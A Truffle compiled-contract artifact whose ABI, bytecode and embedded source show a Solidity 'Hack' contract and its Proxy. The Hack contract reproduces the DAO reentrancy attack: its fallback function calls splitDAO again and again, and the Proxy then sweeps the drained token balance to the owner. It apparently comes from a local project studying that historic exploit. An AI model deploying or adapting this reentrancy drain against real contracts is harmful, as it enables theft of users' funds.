{
  "contractName": "Proxy",
  "abi": [
    {
      "inputs": [
        {
          "name": "_dao",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "empty",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6060604052341561000f57600080fd5b6040516020806103908339810160405280805190602001909190505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506102d4806100bc6000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063f2a75fe414610046575b600080fd5b341561005157600080fd5b61005961005b565b005b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156100b9576102a5565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b151561017d57600080fd5b6102c65a03f1151561018e57600080fd5b5050506040518051905090506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836000604051602001526040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b151561028857600080fd5b6102c65a03f1151561029957600080fd5b50505060405180519050505b505600a165627a7a723058200feb35380b00fd0e0f6fa6f8f95ee7e660b5797b01760e64a9dc35b5f23717d00029",
  "source": "import \"./DAOInterface.sol\";\n\ncontract Proxy {\n  DAOInterface DAO;\n  address owner;\n\n  function Proxy(address _dao) {\n    owner = msg.sender;\n    DAO = DAOInterface(_dao);\n  }\n\n  function empty() {\n    if (msg.sender != owner) return;\n\n    uint balance = DAO.balanceOf(this);\n    DAO.transfer(owner, balance);\n  }\n}\n\ncontract Hack {\n  uint public proposalID;\n  DAOInterface public DAO;\n  uint public calls_to_make;\n  uint public calls;\n  Proxy public proxy;\n\n  function Hack(address _dao) {\n    DAO = DAOInterface(_dao);\n    calls = 0;\n    proxy = new Proxy(_dao);\n    calls_to_make = 1;\n  }\n\n  function makeSplitProposal() {\n    // 0x4c6f6e656c792c20736f204c6f6e656c79 == \"Lonely, so Lonely\"\n    // 0x93a80 == 604800 == 1 week in seconds\n    bytes memory transactionData;\n    proposalID = DAO.newProposal(this, 0x0, \"Lonely, so Lonely\", transactionData, 0x93a80, true);\n  }\n\n  function voteYesOnProposal() {\n    DAO.vote(proposalID, true);\n  }\n\n  function fillProxy() {\n    uint balance = DAO.balanceOf(this);\n    DAO.transfer(address(proxy), balance);\n  }\n\n  function splitDAO() {\n    calls += 1;\n    DAO.splitDAO(proposalID, this);\n  }\n\n  function runHack(uint _calls_to_make) {\n    calls = 0;\n    calls_to_make = _calls_to_make;\n    proxy.empty();\n    splitDAO();\n  }\n\n  function() {\n    if (calls < calls_to_make) {\n      splitDAO();\n    } else {\n      fillProxy();\n    }\n  }\n}\n",
  "sourcePath": "/home/utkarash/dao-truffle/contracts/Hack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.19+commit.c4cbbb05.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2018-03-10T18:24:34.676Z"
}